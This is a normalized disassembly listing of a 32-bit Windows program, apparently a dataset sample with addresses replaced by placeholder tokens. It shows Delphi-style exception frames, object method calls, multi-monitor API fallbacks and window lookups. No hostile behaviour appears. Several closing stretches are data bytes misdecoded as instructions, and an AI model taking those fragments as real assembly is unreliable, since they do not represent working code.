xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
call sub_404650
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x10 ]
call sub_419898
mov ebx eax
mov eax [ ebx + 0x4 ]
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
inc eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x10 ] 0x0
xor edx edx
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov ebx eax
test ebx ebx
jl r-xdata
inc [ ebp - 0x10 ]
dec [ ebp - 0x24 ]
jne r-xdata
xor eax eax
push ebp
push sub_42d956
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
call sub_404650
retn
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x20 ]
call sub_419898
mov ebx eax
mov eax [ ebx + 0x4 ]
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
call sub_404650
retn
inc esi
mov [ ebp - 0x14 ] 0x0
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x30 ]
mov ecx ebx
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
call [ edi + 0x3c ]
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
sub_42da44
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42dab8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_419898
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_407024
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_407050
mov eax [ ebp - 0x8 ]
mov ecx esi
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dabf
lea eax [ ebp - 0x8 ]
call sub_40700c
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
sub_42dad8
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42dd51
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x20
mov edx [ ebp - 0x18 ]
call sub_405584
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
inc ebx
xor esi esi
cmp [ ebp - 0x1c ] 0x1
jne r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
inc esi
dec ebx
jne r-xdata
inc [ ebp - 0x1c ]
mov [ ebp - 0x8 ] esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
push ebp
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_42da44
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_419898
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0xc ]
call sub_407024
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov ecx r-xdata
call sub_407050
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
push ebp
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_42da44
pop ecx
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_407050
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dd58
lea eax [ ebp - 0x34 ]
call sub_40700c
lea eax [ ebp - 0x30 ]
call sub_405530
lea eax [ ebp - 0x2c ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4060f8
lea eax [ ebp - 0x10 ]
call sub_40700c
lea eax [ ebp - 0xc ]
call sub_40700c
retn
push ebp
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_42da44
pop ecx
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x20 ] eax
xor edx edx
push ebp
push sub_42dced
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
test eax eax
jl r-xdata
inc ebx
xor esi esi
push ebp
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_42da44
pop ecx
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x4 ]
call sub_407024
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov ecx r-xdata
call sub_407050
mov eax [ ebp - 0x34 ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
inc esi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x30 ]
mov ecx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
call sub_404650
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_419898
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x4 ]
call sub_407024
lea eax [ ebp - 0x2c ]
mov edx [ ebp - 0xc ]
mov ecx r-xdata
call sub_407050
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_42dd84
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0xc ] edx
mov edi eax
xor eax eax
push ebp
push sub_42de47
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ edi + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
lea eax [ edi + 0x20 ]
mov edx ebx
call sub_405584
mov eax [ edi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42de4e
lea eax [ ebp - 0x8 ]
call sub_40700c
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov eax [ edi + 0x14 ]
mov edx esi
call sub_419898
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_407024
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_407050
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42deb4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_42df5e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x20 ]
mov edx [ ebp - 0x4 ]
call sub_405584
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_42dad8
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42df65
mov eax ebx
call sub_42d540
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_42d570
jmp r-xdata
sub ax 0x5
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_42dad8
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42d6d4
sub_42df70
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42e08d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x19 ] 0x0
test ebx ebx
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x20
mov edx ebx
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e094
lea eax [ ebp - 0x8 ]
call sub_40700c
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x18 ] 0x0
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x18 ]
call sub_419898
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_407024
xor eax eax
push ebp
push sub_42e05c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_40700c
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f954
test al al
je r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov [ ebp - 0x19 ] al
xor edx edx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebp - 0x11 ] 0x1
call sub_404f70
jmp r-xdata
retn
movzx edx [ ebp - 0x19 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
sub_42e0c8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_419898
cmp ebp [ eax + 0x8 ]
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_419898
mov edi eax
cmp ebp [ edi + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_41978c
jmp r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_41978c
mov eax edi
call sub_404650
jmp r-xdata
sub_42e138
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42e169
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e170
retn
mov eax rw-data
call sub_40700c
sub_42e174
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_42e231
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
movzx eax bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e238
lea eax [ ebp - 0x4 ]
call sub_405530
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
movzx eax bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42e174
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_405530
sub_42e258
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_42e174
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_42e2e0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_42e174
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_42e370
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_42e174
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_42e2e0
sub_42e406
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_42e174
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_42e487
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42e174
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x48
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42e574
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_42e174
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x48
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42e648
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_42e174
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x48
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42e71c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_42e174
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_42e8b7
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42e8dd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e8e4
retn
sub_42e8e8
xor al 0xe9
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 8 ] bh
inc edx
add [ eax + eax ] al
add [ eax ] al
rcl [ eax ] 0x40
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ esp + ebp * 8 - 0x1347ffbe ] dh
inc edx
add [ esi ] cl
push esp
push ebx
jns r-xdata
arpl [ gs : ebx + ecx * 4 - 0x40 ] si
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x68 ] si
jmp r-xdata
imul ebp [ edi + 0x6e ] 0x5300408d
push esi
push edi
call sub_407688
cmp [ eax + 0x10 ] 0x0
je r-xdata
outsb
je r-xdata
add dl ch
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 8 ] cl
inc edx
add [ eax ] dl
add [ eax ] al
add [ ecx + ebp * 8 + 0x42 ] cl
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax ] al
in eax dx
inc edx
add [ esp + ebp * 8 - 0x1347ffbe ] dh
inc edx
add [ eax ] dh
in eax dx
inc edx
add [ esi ] al
push esp
inc ebp
jbe r-xdata
add ch ch
inc edx
add [ esp + ebp * 8 - 0x1347ffbe ] dh
inc edx
add [ eax ] dh
in eax dx
inc edx
add [ 0x6e614854 ] cl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
call sub_407688
mov eax [ eax + 0x10 ]
push eax
call IsWindow
test eax eax
jne r-xdata
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
or eax 0x6e614854
pushad
0x42 0x0
xor esi esi
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
call sub_407688
mov eax [ eax + 0x10 ]
pop edi
pop esi
pop ebx
retn
push 0x0
call sub_407688
mov eax [ eax + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
mov edi eax
call GetCurrentThreadId
cmp edi eax
jne r-xdata
mov esi 0xfffffffd
jmp r-xdata
push 0x0
push r-xdata
push ebx
push esi
call FindWindowExA
mov ebx eax
call sub_407688
mov [ eax + 0x10 ] ebx
call sub_407688
mov ebx [ eax + 0x10 ]
call sub_407688
cmp [ eax + 0x10 ] 0x0
je r-xdata
xor ebx ebx
sub_42ea7c
push ebx
push esi
push edi
call sub_407688
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
call sub_407688
mov eax [ eax + 0x10 ]
push eax
call IsWindow
test eax eax
jne r-xdata
xor esi esi
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
call sub_407688
mov eax [ eax + 0x10 ]
pop edi
pop esi
pop ebx
retn
push 0x0
call sub_407688
mov eax [ eax + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
mov edi eax
call GetCurrentThreadId
cmp edi eax
jne r-xdata
mov esi 0xfffffffd
jmp r-xdata
push 0x0
push r-xdata
push ebx
push esi
call FindWindowExA
mov ebx eax
call sub_407688
mov [ eax + 0x10 ] ebx
call sub_407688
